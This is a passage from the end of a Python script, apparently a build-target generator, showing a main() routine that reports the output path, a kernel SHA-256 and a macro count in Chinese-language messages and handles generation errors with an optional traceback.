        print(f"生成成功: {args.output.resolve()}")
        print(f"kernel SHA-256: {boot.kernel_sha256}")
        print(f"target macros: {macro_count}")
        return 0
    except GenerationError as exc:
        if os.environ.get("TARGET_GENERATOR_TRACEBACK") == "1":
            raise
        print(f"生成失败: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
